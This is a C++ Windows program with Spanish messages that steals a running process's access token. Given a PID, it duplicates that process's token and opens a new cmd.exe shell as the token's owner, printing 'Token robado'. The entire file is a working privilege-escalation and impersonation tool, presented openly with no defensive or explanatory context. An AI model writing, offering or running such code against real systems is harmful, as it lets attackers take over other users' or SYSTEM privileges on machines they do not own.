#include <Windows.h>
#include <iostream>
#include <UserEnv.h>

int main(int argc, char* argv[]) {

	if (argc < 2) {
		std::cout << "Uso: " << argv[0] << " <PID del proceso>\n";
		return -1;
	}

	HANDLE pHandle;
	HANDLE tHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	SecureZeroMemory(&startupInfo, sizeof(PROCESS_INFORMATION));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	WCHAR userName[256];
	WCHAR domainName[256];
	DWORD userNameSize = 256;
	DWORD domainNameSize = 256;
	SID_NAME_USE sidNameUse;

	DWORD PID = atoi(argv[1]);
	const wchar_t* newprocessName = L"cmd.exe";

	std::cout << "[+] Obteniendo token del proceso: " << int(PID) << std::endl;

	pHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, PID);
	OpenProcessToken(pHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &tHandle);
	DuplicateTokenEx(tHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);

	std::cout << "[+] Token robado }:)"<< std::endl;

	DWORD dwSize;
	GetTokenInformation(tHandle, TokenUser, NULL, 0, &dwSize);
	PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(new BYTE[dwSize]);
	GetTokenInformation(tHandle, TokenUser, pTokenUser, dwSize, &dwSize);
	PSID pUserSid = pTokenUser->User.Sid;
	LookupAccountSidW(NULL, pUserSid, userName, &userNameSize, domainName, &domainNameSize, &sidNameUse);

	std::wcout << L"[+] Creando proceso " << newprocessName << L" como el usuario " << domainName << L"\\" << userName << std::endl;

	CreateProcessWithTokenW(duplicateTokenHandle, 0, newprocessName, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation);

	if (processInformation.dwProcessId == 0) {
		std::cout << "\n[-] Algo ha fallado... Vuelve a intentarlo o cambia de proceso." << std::endl;
		ExitProcess(-1);
	}

	std::wcout << L"[+] Proceso " << newprocessName << L" creado con el siguiente PID: " << processInformation.dwProcessId << std::endl;

	return 0;

}